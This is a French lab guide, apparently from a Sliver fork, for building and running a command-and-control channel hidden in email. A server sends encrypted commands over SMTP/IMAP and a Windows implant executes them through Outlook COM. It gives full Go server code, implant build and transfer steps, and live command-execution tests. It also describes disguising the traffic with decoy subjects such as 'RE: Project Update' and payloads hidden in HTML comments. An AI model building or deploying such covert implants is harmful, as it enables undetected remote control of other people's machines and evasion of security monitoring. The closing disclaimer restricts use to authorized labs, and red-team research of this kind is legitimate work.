# 🧪 Guide de Lab Complet - Test Outlook C2 Transport

Ce guide te donne **TOUTES** les étapes pour tester le transport Outlook C2 standalone dans un environnement de lab contrôlé.

## 📋 Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────────┐
│                    ARCHITECTURE DU LAB                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  [Machine 1] SERVEUR C2        [Cloud] OFFICE 365/GMAIL        │
│  ┌──────────────────┐          ┌───────────────┐              │
│  │ Linux/Mac        │  SMTP    │               │              │
│  │ - c2-server.go   │─────────►│  Email        │              │
│  │ - Port: aucun    │  :587    │  Provider     │              │
│  │                  │  IMAP    │               │              │
│  │                  │◄─────────│               │              │
│  └──────────────────┘  :993    └───────────────┘              │
│                                        │                        │
│                                        │ COM API                │
│                                        ▼                        │
│  [Machine 2] CIBLE WINDOWS                                     │
│  ┌──────────────────┐                                          │
│  │ Windows 10/11    │                                          │
│  │ - Outlook 2016+  │                                          │
│  │ - implant.exe    │                                          │
│  └──────────────────┘                                          │
│                                                                 │
│  Communication: Serveur ←→ Email ←→ Outlook COM ←→ Implant    │
│  Chiffrement: AES-256-GCM end-to-end                           │
│  Latence typique: 15-30 secondes                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 🎯 Objectifs du Lab

À la fin de ce lab, tu auras :
- ✅ Un serveur C2 fonctionnel qui communique via SMTP/IMAP
- ✅ Un implant Windows qui utilise Outlook COM
- ✅ Communication bidirectionnelle chiffrée testée
- ✅ Compréhension du flux de données complet
- ✅ Métriques de performance (latence, throughput)

## ⏱️ Temps Estimé

- **Setup initial** : 30 minutes
- **Tests basiques** : 15 minutes
- **Tests avancés** : 30 minutes
- **Total** : ~1h15

---

## 📦 PHASE 1 : Prérequis (15 min)

### 1.1 Matériel Nécessaire

| Composant | Spécification | Notes |
|-----------|---------------|-------|
| **Machine Serveur** | Linux/Mac/Windows | N'importe quel OS avec Go |
| **VM Windows** | Windows 10/11 | Pour l'implant |
| **Outlook** | 2016, 2019, 2021, ou 365 | Doit être installé sur Windows VM |
| **Compte Email** | Office 365 ou Gmail | Tu en as déjà un ✅ |

### 1.2 Logiciels à Installer

**Sur la machine serveur** :
```bash
# Vérifier Go
go version
# Minimum: go1.19

# Si pas installé :
# wget https://go.dev/dl/go1.21.linux-amd64.tar.gz
# sudo tar -C /usr/local -xzf go1.21.linux-amd64.tar.gz
```

**Sur la VM Windows** :
- ✅ Microsoft Outlook (n'importe quelle version 2016+)
- ✅ Compte email configuré dans Outlook
- ✅ Go 1.19+ (pour compiler, ou compile depuis Linux)

### 1.3 Vérifier le Code Sliver

```bash
cd /home/user/sliver
git status

# Vérifier que tu es sur la bonne branche
git branch
# Doit montrer: claude/outlook-c2-channel-01FnKputSHE71mT3vzT7QF2o

# Pull les dernières modifications
git pull origin claude/outlook-c2-channel-01FnKputSHE71mT3vzT7QF2o
```

---

## 🔐 PHASE 2 : Configuration Email (20 min)

### 2.1 Option A : Office 365 (Ton Cas)

#### Étape 1 : Activer SMTP/IMAP

Office 365 peut bloquer SMTP/IMAP par défaut. Voici comment activer :

**Méthode 1 : Via le portail admin (si tu as accès admin)** :

1. Aller sur https://admin.microsoft.com
2. Settings → Org settings → Mail
3. Activer "Authenticated SMTP"
4. Sauvegarder

**Méthode 2 : Via Exchange Admin Center** :

1. https://admin.exchange.microsoft.com
2. Recipients → Mailboxes
3. Sélectionner ton compte
4. Mail flow settings → Email apps
5. Cocher "Authenticated SMTP" et "IMAP"
6. Save

**Méthode 3 : App Password (le plus simple)** :

Si tu n'as pas accès admin, utilise un App Password :

1. Aller sur https://account.microsoft.com/security
2. Security info → Add sign-in method → App password
3. Créer un app password nommé "Sliver C2"
4. **COPIER LE MOT DE PASSE** (tu ne le reverras pas)

#### Étape 2 : Tester la connexion

**Test SMTP** :
```bash
# Installer openssl si besoin
# Linux: sudo apt install openssl
# Mac: déjà installé

# Tester SMTP
openssl s_client -starttls smtp -connect smtp.office365.com:587

# Une fois connecté, taper :
EHLO test
AUTH LOGIN
# (Ctrl+C pour sortir)
```

**Test IMAP** :
```bash
openssl s_client -connect outlook.office365.com:993

# Une fois connecté, taper :
a1 LOGIN ton-email@domaine.com ton-mot-de-passe
# Si erreur : vérifier credentials
# (Ctrl+C pour sortir)
```

#### Étape 3 : Noter les Paramètres

Créer un fichier `/tmp/outlook-config.txt` :
```
SMTP Host: smtp.office365.com
SMTP Port: 587
IMAP Host: outlook.office365.com
IMAP Port: 993
Username: ton-email@domaine.com
Password: ton-mot-de-passe-ou-app-password
```

### 2.2 Option B : Gmail (Alternative Plus Simple)

Si Office 365 pose problème, utilise Gmail pour le lab :

#### Étape 1 : Créer/Utiliser un Compte Gmail

1. Créer un compte Gmail test : https://accounts.google.com/signup
2. Exemple : `sliver-c2-test@gmail.com`

#### Étape 2 : Activer 2FA

1. https://myaccount.google.com/security
2. 2-Step Verification → Get Started
3. Suivre les étapes

#### Étape 3 : Générer App Password

1. https://myaccount.google.com/apppasswords
2. Select app : "Mail"
3. Select device : "Other" → taper "Sliver C2"
4. Generate
5. **COPIER LE MOT DE PASSE** (16 caractères, ex: `abcd efgh ijkl mnop`)

#### Étape 4 : Paramètres Gmail

```
SMTP Host: smtp.gmail.com
SMTP Port: 587
IMAP Host: imap.gmail.com
IMAP Port: 993
Username: sliver-c2-test@gmail.com
Password: abcd efgh ijkl mnop (app password)
```

---

## 🔑 PHASE 3 : Génération des Clés (5 min)

### 3.1 Générer la Clé de Chiffrement

```bash
cd /home/user/sliver/implant/sliver/transports/outlook/cmd/keygen

# Générer la clé
go run main.go

# Exemple de sortie :
# a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890
```

**IMPORTANT** : Cette clé doit être **IDENTIQUE** sur le serveur et l'implant !

Sauvegarder :
```bash
echo "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890" > /tmp/outlook-key.txt
cat /tmp/outlook-key.txt
```

### 3.2 Générer le Session ID

```bash
# Sur Linux/Mac
uuidgen

# Exemple de sortie :
# f47ac10b-58cc-4372-a567-0e02b2c3d479
```

Sauvegarder :
```bash
echo "f47ac10b-58cc-4372-a567-0e02b2c3d479" > /tmp/session-id.txt
cat /tmp/session-id.txt
```

---

## 🖥️ PHASE 4 : Setup Serveur C2 (15 min)

### 4.1 Installer les Dépendances

```bash
# Dépendances IMAP
go get github.com/emersion/go-imap
go get github.com/emersion/go-imap/client

# UUID (normalement déjà présent)
go get github.com/google/uuid
```

### 4.2 Créer le Serveur

Le code est déjà dans `/home/user/sliver/lab-test/` mais on va le recréer avec ta config.

Créer `/home/user/sliver/lab-test/c2-server.go` :

```go
package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports/outlook"
	outlookc2 "github.com/bishopfox/sliver/server/c2/outlook"
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// ===== CONFIGURATION =====
	// À PERSONNALISER AVEC TES VALEURS !

	// Lire la clé depuis le fichier
	encKeyHex := "COLLER_ICI_LA_CLE_DE_/tmp/outlook-key.txt"
	encKey, err := outlook.HexToKey(encKeyHex)
	if err != nil {
		log.Fatalf("Invalid encryption key: %v", err)
	}

	// Configuration serveur
	config := &outlookc2.ServerConfig{
		// === SMTP Configuration ===
		SMTPHost:     "smtp.office365.com",      // ou smtp.gmail.com
		SMTPPort:     587,
		SMTPUsername: "ton-email@domaine.com",   // TON EMAIL
		SMTPPassword: "ton-mot-de-passe",        // TON MOT DE PASSE
		SMTPUseTLS:   true,

		// === IMAP Configuration ===
		IMAPHost:     "outlook.office365.com",   // ou imap.gmail.com
		IMAPPort:     993,
		IMAPUsername: "ton-email@domaine.com",   // MÊME EMAIL
		IMAPPassword: "ton-mot-de-passe",        // MÊME MOT DE PASSE
		IMAPUseTLS:   true,
		IMAPFolder:   "INBOX",

		// === C2 Configuration ===
		C2Email:       "ton-email@domaine.com",  // MÊME EMAIL
		EncryptionKey: encKey,
		PollInterval:  10 * time.Second,         // 10s pour le lab
		MarkAsRead:    true,
		DeleteAfter:   false,                    // false pour voir les emails
		Debug:         true,
	}

	// Afficher la config (sans les mots de passe)
	log.Println("╔════════════════════════════════════════════════════╗")
	log.Println("║      OUTLOOK C2 SERVER - LAB TEST MODE            ║")
	log.Println("╚════════════════════════════════════════════════════╝")
	log.Printf("C2 Email:         %s", config.C2Email)
	log.Printf("SMTP Server:      %s:%d", config.SMTPHost, config.SMTPPort)
	log.Printf("IMAP Server:      %s:%d", config.IMAPHost, config.IMAPPort)
	log.Printf("Encryption Key:   %s...", encKeyHex[:32])
	log.Printf("Poll Interval:    %v", config.PollInterval)
	log.Printf("Delete After:     %v", config.DeleteAfter)
	log.Println("════════════════════════════════════════════════════")

	// Valider la config
	if err := config.Validate(); err != nil {
		log.Fatalf("❌ Invalid config: %v", err)
	}

	// Créer le handler
	handler, err := outlookc2.NewOutlookC2Handler(config)
	if err != nil {
		log.Fatalf("❌ Failed to create handler: %v", err)
	}

	// Démarrer le handler
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	log.Println("🚀 Starting C2 server...")
	if err := handler.Start(ctx); err != nil {
		log.Fatalf("❌ Failed to start handler: %v", err)
	}

	log.Println("✅ Outlook C2 Server STARTED")
	log.Println("📬 Waiting for implants...")
	log.Println("📊 Status updates every 30 seconds")
	log.Println("🛑 Press Ctrl+C to stop")
	log.Println()

	// Console interactive pour envoyer des commandes
	go func() {
		reader := bufio.NewReader(os.Stdin)
		log.Println("💬 Interactive mode ready. Type 'help' for commands.")

		for {
			fmt.Print("\nc2> ")
			input, _ := reader.ReadString('\n')
			input = strings.TrimSpace(input)

			if input == "" {
				continue
			}

			parts := strings.SplitN(input, " ", 3)
			cmd := parts[0]

			switch cmd {
			case "help":
				fmt.Println("Commands:")
				fmt.Println("  sessions              - List active sessions")
				fmt.Println("  send <sessionID> <cmd> - Send command to session")
				fmt.Println("  results <sessionID>   - Show completed tasks")
				fmt.Println("  help                  - Show this help")
				fmt.Println("  quit                  - Stop server")

			case "sessions":
				sessions := handler.ListSessions()
				if len(sessions) == 0 {
					fmt.Println("No active sessions")
				} else {
					fmt.Printf("Active sessions: %d\n", len(sessions))
					for _, s := range sessions {
						fmt.Printf("  - Session: %s\n", s.SessionID[:8])
						fmt.Printf("    Email: %s\n", s.ImplantEmail)
						fmt.Printf("    Last seen: %v ago\n", time.Since(s.LastSeen).Round(time.Second))
						fmt.Printf("    Pending: %d, Completed: %d\n",
							len(s.GetPendingTasks()),
							len(s.GetCompletedTasks()))
					}
				}

			case "send":
				if len(parts) < 3 {
					fmt.Println("Usage: send <sessionID> <command>")
					continue
				}
				sessionID := parts[1]
				command := parts[2]

				// Trouver la session pour avoir l'email
				session := handler.GetSession(sessionID)
				if session == nil {
					fmt.Printf("Session not found: %s\n", sessionID)
					continue
				}

				fmt.Printf("Sending command '%s' to session %s...\n", command, sessionID[:8])
				taskID, err := handler.SendCommand(sessionID, session.ImplantEmail, command)
				if err != nil {
					fmt.Printf("❌ Error: %v\n", err)
					continue
				}

				fmt.Printf("✅ Command sent, Task ID: %s\n", taskID[:8])
				fmt.Println("Waiting for result (timeout 2 min)...")

				result, err := handler.WaitForTaskResult(sessionID, taskID, 2*time.Minute)
				if err != nil {
					fmt.Printf("❌ Timeout or error: %v\n", err)
					continue
				}

				fmt.Printf("✅ Result received:\n")
				fmt.Printf("────────────────────────────────\n")
				fmt.Println(result.Result)
				fmt.Printf("────────────────────────────────\n")

			case "results":
				if len(parts) < 2 {
					fmt.Println("Usage: results <sessionID>")
					continue
				}
				sessionID := parts[1]
				session := handler.GetSession(sessionID)
				if session == nil {
					fmt.Printf("Session not found: %s\n", sessionID)
					continue
				}

				results := session.GetCompletedTasks()
				if len(results) == 0 {
					fmt.Println("No completed tasks")
				} else {
					fmt.Printf("Completed tasks: %d\n", len(results))
					for _, r := range results {
						fmt.Printf("  Task %s: %s\n", r.TaskID[:8], r.Result[:50])
					}
				}

			case "quit":
				fmt.Println("Shutting down...")
				handler.Stop()
				os.Exit(0)

			default:
				fmt.Printf("Unknown command: %s (type 'help' for commands)\n", cmd)
			}
		}
	}()

	// Monitoring périodique
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			sessions := handler.ListSessions()
			log.Printf("📊 Status: %d active session(s)", len(sessions))
			for _, s := range sessions {
				log.Printf("   └─ %s (email: %s, last: %v ago)",
					s.SessionID[:8],
					s.ImplantEmail,
					time.Since(s.LastSeen).Round(time.Second))
			}
		}
	}()

	// Attendre interruption
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	<-sigChan

	log.Println("\n🛑 Shutting down...")
	handler.Stop()

	// Stats finales
	sessions := handler.ListSessions()
	log.Printf("📊 Final stats: %d total session(s)", len(sessions))
	log.Println("✅ Server stopped")
}
```

### 4.3 Configurer le Serveur

```bash
cd /home/user/sliver/lab-test

# Éditer c2-server.go
nano c2-server.go

# Remplacer :
# 1. COLLER_ICI_LA_CLE... → Copier depuis /tmp/outlook-key.txt
# 2. ton-email@domaine.com → Ton email O365
# 3. ton-mot-de-passe → Ton mot de passe O365 (ou app password)
```

### 4.4 Compiler et Tester

```bash
# Compiler
cd /home/user/sliver/lab-test
go build -o c2-server c2-server.go

# Tester (Ctrl+C pour arrêter après quelques secondes)
./c2-server
```

**Sortie attendue** :
```
╔════════════════════════════════════════════════════╗
║      OUTLOOK C2 SERVER - LAB TEST MODE            ║
╚════════════════════════════════════════════════════╝
C2 Email:         ton-email@domaine.com
SMTP Server:      smtp.office365.com:587
IMAP Server:      outlook.office365.com:993
Encryption Key:   a1b2c3d4e5f67890abcdef123456...
Poll Interval:    10s
Delete After:     false
════════════════════════════════════════════════════
🚀 Starting C2 server...
[Outlook C2] Connected to IMAP server: outlook.office365.com:993
✅ Outlook C2 Server STARTED
📬 Waiting for implants...
📊 Status updates every 30 seconds
🛑 Press Ctrl+C to stop

💬 Interactive mode ready. Type 'help' for commands.

c2>
```

**Si erreur** : Vérifier email/mot de passe et que SMTP AUTH est activé.

---

## 💻 PHASE 5 : Setup Implant Windows (20 min)

### 5.1 Préparer la VM Windows

**Vérifications** :

1. **Outlook installé** :
   ```powershell
   Get-Process | Where-Object {$_.ProcessName -like "*outlook*"}
   ```

2. **Compte email configuré** :
   - Ouvrir Outlook
   - File → Account Settings → Account Settings
   - Vérifier qu'un compte est configuré
   - **Important** : Tester envoi/réception manuel

3. **Go installé** (optionnel si tu compiles depuis Linux) :
   ```powershell
   go version
   ```

### 5.2 Créer l'Implant

Le fichier `/home/user/sliver/lab-test/implant.go` existe déjà, on va le configurer.

**Sur ta machine serveur**, éditer :

```bash
cd /home/user/sliver/lab-test
nano implant.go
```

Remplacer les valeurs :

```go
// IMPORTANT: Même clé que le serveur !
encKeyHex := "COLLER_ICI_LA_CLE_DE_/tmp/outlook-key.txt"

// Session ID (celui de /tmp/session-id.txt)
sessionID := "COLLER_ICI_LE_SESSION_ID"

// Email du C2 (MÊME que le serveur)
c2Email := "ton-email@domaine.com"
```

### 5.3 Compiler l'Implant pour Windows

**Option A : Cross-compile depuis Linux** (Recommandé) :

```bash
cd /home/user/sliver/lab-test

# Cross-compile pour Windows
GOOS=windows GOARCH=amd64 go build -o implant.exe implant.go

# Vérifier
file implant.exe
# Doit montrer: PE32+ executable
```

**Option B : Compiler sur Windows** :

```powershell
# Sur la VM Windows
cd C:\Users\User\Downloads
# Copier implant.go ici

go build -o implant.exe implant.go
```

### 5.4 Transférer l'Implant

**Méthodes** :

```bash
# 1. Via SMB (si VM dans le même réseau)
smbclient //VM-IP/C$ -U username
put implant.exe

# 2. Via HTTP simple
python3 -m http.server 8000
# Sur Windows : Invoke-WebRequest http://server-ip:8000/implant.exe -OutFile implant.exe

# 3. Via RDP : Copier/coller

# 4. Via USB si VM locale
```

---

## 🚀 PHASE 6 : Tests End-to-End (20 min)

### 6.1 Démarrer le Serveur C2

```bash
cd /home/user/sliver/lab-test
./c2-server

# Attendre :
# ✅ Outlook C2 Server STARTED
# 📬 Waiting for implants...
```

### 6.2 Démarrer l'Implant

**Sur la VM Windows** :

```powershell
# Ouvrir PowerShell en Admin (optionnel)

cd C:\Users\User\Downloads

# Lancer l'implant
.\implant.exe

# Sortie attendue :
# ==============================================
#    OUTLOOK IMPLANT - LAB TEST
# ==============================================
# C2 Email: ton-email@domaine.com
# Session ID: f47ac10b...
# Poll Interval: 15s
# OS: windows
# ==============================================
# [+] Transport STARTED
# [+] Implant is running...
```

**Vérifier sur le serveur** :

Tu devrais voir après ~15-30 secondes :

```
📊 Status: 1 active session(s)
   └─ f47ac10b (email: ton-email@domaine.com, last: 5s ago)
```

### 6.3 Envoyer une Première Commande

**Sur le serveur** :

```bash
c2> sessions
Active sessions: 1
  - Session: f47ac10b
    Email: ton-email@domaine.com
    Last seen: 10 seconds ago
    Pending: 0, Completed: 0

c2> send f47ac10b-58cc-4372-a567-0e02b2c3d479 whoami
Sending command 'whoami' to session f47ac10b...
✅ Command sent, Task ID: task-abc1
Waiting for result (timeout 2 min)...
```

**Ce qui se passe** :

1. Serveur encode "whoami" + chiffre AES-256
2. Serveur envoie email via SMTP à ton-email@domaine.com
3. Email arrive dans la mailbox O365
4. Implant poll Outlook via COM
5. Implant trouve l'email, déchiffre
6. Implant exécute "whoami"
7. Implant encode résultat + chiffre
8. Implant envoie email via Outlook COM
9. Serveur reçoit via IMAP
10. Serveur déchiffre et affiche

**Résultat attendu** :

```
✅ Result received:
────────────────────────────────
COMPANY\username
────────────────────────────────
```

### 6.4 Tests Supplémentaires

```bash
# Test 2 : hostname
c2> send f47ac10b... hostname
✅ Result: DESKTOP-ABC123

# Test 3 : ipconfig (Windows)
c2> send f47ac10b... "ipconfig /all"
✅ Result: [configuration réseau]

# Test 4 : Liste processus
c2> send f47ac10b... tasklist
✅ Result: [liste processus]

# Test 5 : Informations système
c2> send f47ac10b... systeminfo
✅ Result: [infos système]
```

---

## 📊 PHASE 7 : Métriques et Analyse (10 min)

### 7.1 Mesurer la Latence

Sur le serveur, note le temps entre envoi et réception :

```bash
# Envoyer une commande et mesurer
time (c2> send f47ac10b... whoami)

# Typique : 15-45 secondes
```

**Latence dépend de** :
- Poll interval implant (15s)
- Poll interval serveur (10s)
- Latence email provider (5-15s)

### 7.2 Vérifier les Emails

**Dans ton webmail** (Outlook.com ou Gmail) :

1. Aller dans INBOX / Sent
2. Tu devrais voir des emails avec des sujets normaux :
   - "RE: Project Update"
   - "Meeting Notes - 11/25"
   - "Quick Question"
   - etc.
3. Ouvrir un email :
   - Corps : Texte normal
   - Caché : `<!--C2DATA-->...<!--/C2DATA-->`
4. Le payload est illisible (chiffré en base64)

### 7.3 Vérifier le Chiffrement

**Sur le serveur** :

```bash
# Afficher un email brut
# (dans les logs debug du serveur, chercher "Processing email")

# Tu devrais voir :
# - Subject: RE: Project Update (normal)
# - Body: email normal + <!--C2DATA-->aBcDef123...
# - Payload: chiffré, impossible à lire sans la clé
```

### 7.4 Tests de Robustesse

```bash
# Test 1 : Arrêter l'implant
# Sur Windows : Ctrl+C
# Relancer après 1 minute
# Vérifier reconnexion automatique

# Test 2 : Mauvaise commande
c2> send session-id commande-invalide
# Vérifier que l'erreur est retournée

# Test 3 : Commande longue
c2> send session-id "dir C:\ /s"
# Vérifier que le gros résultat passe

# Test 4 : Multiple commandes rapides
c2> send session-id whoami
c2> send session-id hostname
c2> send session-id ipconfig
# Vérifier que toutes sont traitées
```

---

## 🐛 PHASE 8 : Troubleshooting

### Problème 1 : Serveur ne démarre pas

**Symptôme** : Erreur SMTP/IMAP connection

**Solutions** :

```bash
# Vérifier credentials
cat /tmp/outlook-config.txt

# Tester SMTP manuellement
telnet smtp.office365.com 587
# ou
openssl s_client -starttls smtp -connect smtp.office365.com:587

# Tester IMAP
telnet outlook.office365.com 993
# ou
openssl s_client -connect outlook.office365.com:993
```

**Checklist** :
- [ ] Email/password corrects
- [ ] SMTP AUTH activé sur O365
- [ ] Pas de 2FA bloquant (utiliser app password)
- [ ] Firewall ouvert sur ports 587/993

### Problème 2 : Implant ne se connecte pas

**Symptôme** : Pas de session sur le serveur

**Solutions** :

```powershell
# Sur Windows, vérifier Outlook
Get-Process outlook
# Doit être en cours d'exécution

# Vérifier COM
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$inbox = $namespace.GetDefaultFolder(6)
Write-Host "Inbox items:" $inbox.Items.Count
# Doit afficher un nombre
```

**Checklist** :
- [ ] Outlook installé et configuré
- [ ] Compte email fonctionnel dans Outlook
- [ ] Outlook peut send/receive
- [ ] Outlook n'est PAS en mode "Work Offline"
- [ ] Clé de chiffrement identique serveur/implant
- [ ] Session ID correct

### Problème 3 : Commandes envoyées mais pas reçues

**Symptôme** : Timeout waiting for result

**Debug** :

```bash
# Sur serveur, activer debug (déjà fait)
# Chercher dans les logs :

# Email envoyé ?
grep "send email" logs
# Doit montrer : [smtp] Sending to: ...

# Email reçu côté implant ?
# Sur Windows logs implant :
grep "Found.*emails" logs
# Doit montrer : Found X unread emails
```

**Causes possibles** :
1. **Dossier wrong** : Implant check INBOX, mais email dans SPAM
   - Solution : Check spam folder ou utiliser folder_type: 6 (INBOX)

2. **Filtrage email** : Provider bloque emails "suspects"
   - Solution : Whitelist l'adresse ou désactiver filtres

3. **Latence réseau** : Simplement attendre plus longtemps
   - Solution : Augmenter timeout (2-5 minutes)

4. **Clé mismatch** : Implant ne peut pas déchiffrer
   - Solution : Vérifier que les clés matchent exactement

### Problème 4 : Décryption failed

**Symptôme** : `decryption error: authentication failed`

**Cause** : Clés différentes entre serveur et implant

**Solution** :

```bash
# Vérifier sur serveur
grep "Encryption Key" c2-server.go

# Vérifier dans implant.go
grep "encKeyHex" implant.go

# Doivent être IDENTIQUES caractère par caractère
diff <(echo "clé-serveur") <(echo "clé-implant")
```

---

## 📈 PHASE 9 : Résultats Attendus

### Métriques de Succès

| Métrique | Valeur Attendue | Ta Valeur |
|----------|----------------|-----------|
| **Latence commande → résultat** | 15-45 secondes | ____s |
| **Taux de succès commandes** | 95-100% | ___% |
| **CPU serveur** | <1% | ___% |
| **RAM serveur** | 20-50 MB | ___ MB |
| **CPU implant** | <1% | ___% |
| **RAM implant** | 10-20 MB | ___ MB |
| **Emails générés** | 2 par commande | ___ |

### Checklist de Validation

- [ ] ✅ Serveur démarre sans erreur
- [ ] ✅ Serveur se connecte à IMAP/SMTP
- [ ] ✅ Implant démarre sans erreur
- [ ] ✅ Implant se connecte à Outlook COM
- [ ] ✅ Session apparaît sur le serveur
- [ ] ✅ Commande "whoami" réussit
- [ ] ✅ Commande "hostname" réussit
- [ ] ✅ Commande complexe réussit
- [ ] ✅ Latence <60 secondes
- [ ] ✅ Emails sont chiffrés
- [ ] ✅ Emails ressemblent à du trafic normal

### Logs de Référence

**Serveur (succès)** :
```
✅ Outlook C2 Server STARTED
📬 Waiting for implants...
[Outlook C2] Connected to IMAP server
[Outlook C2] Processing 0 emails
📊 Status: 1 active session(s)
   └─ f47ac10b (email: user@domain.com, last: 10s ago)
[Outlook C2] Processing 1 emails
[Outlook C2] Result received for task task-123
```

**Implant (succès)** :
```
[+] Outlook Transport created
[+] Connecting to Outlook...
[Outlook Transport] Polling for commands...
[Outlook Transport] Found 1 unread emails
[IMPLANT] Executing command: whoami
[IMPLANT] Command output (15 bytes)
[Outlook Transport] Results sent for TaskID: task-123
```

---

## 🎓 PHASE 10 : Nettoyage et Documentation

### 10.1 Arrêter les Composants

```bash
# Serveur : Ctrl+C
# Implant Windows : Ctrl+C

# Vérifier arrêt propre
ps aux | grep c2-server
ps aux | grep implant.exe
```

### 10.2 Nettoyer les Emails (Optionnel)

**Dans Outlook Web** :
1. Aller dans INBOX / Sent
2. Chercher emails de test
3. Supprimer (ils sont chiffrés donc pas de risque)

Ou laisser `DeleteAfter: true` faire le cleanup automatiquement.

### 10.3 Documenter Tes Résultats

Créer `/tmp/lab-results.txt` :

```
=== OUTLOOK C2 LAB TEST RESULTS ===

Date: 2024-11-25
Tester: [Ton nom]

SETUP:
- Email provider: Office 365 / Gmail
- Serveur OS: Linux
- Implant OS: Windows 10

METRICS:
- Latency min: __s
- Latency max: __s
- Latency avg: __s
- Success rate: __%
- Total commands: __

OBSERVATIONS:
- [Note 1]
- [Note 2]
- [Note 3]

ISSUES:
- [Issue 1 + solution]
- [Issue 2 + solution]

CONCLUSION:
✅ Transport fonctionne
⚠️ Points d'attention
```

---

## 🚀 PHASE 11 : Prochaines Étapes

### Si le Lab Fonctionne

**Option A : Utiliser en Standalone** :
- Deploy en red team avec ce setup
- Créer tes propres implants custom
- Adapter pour tes besoins

**Option B : Intégrer dans Sliver** :
- Suivre `OUTLOOK_INTEGRATION_SNIPPET.go`
- Modifier `session.go`
- Build avec Sliver complet
- Bénéficier de toutes les features Sliver

### Si Problèmes Persistent

**Ouvrir un ticket** avec :
1. Logs complets serveur et implant
2. Configuration (sans passwords)
3. Messages d'erreur exacts
4. OS/versions

---

## 📚 Références

- **Guide complet** : `OUTLOOK_C2_DEPLOYMENT_GUIDE.md`
- **Status** : `OUTLOOK_C2_STATUS.md`
- **API implant** : `implant/sliver/transports/outlook/README.md`
- **API serveur** : `server/c2/outlook/README.md`
- **Intégration** : `implant/sliver/transports/outlook/INTEGRATION.md`

---

## ✅ Checklist Finale

Avant de considérer le lab comme réussi :

- [ ] Serveur démarre proprement
- [ ] Implant se connecte
- [ ] Au moins 3 commandes différentes réussies
- [ ] Latence mesurée et acceptable
- [ ] Emails vérifiés (chiffrés et normaux)
- [ ] Résultats documentés
- [ ] Compréhension du flux complet

**FÉLICITATIONS !** 🎉

Tu as un transport Outlook C2 fonctionnel dans ton lab !

---

**Temps total** : ~1h15 (setup) + tests
**Difficulté** : Moyenne
**Prérequis** : Connaissances réseau/email basiques
**Support** : Check les README et guides

**⚠️ RAPPEL** : Ceci est pour des tests autorisés en lab uniquement !
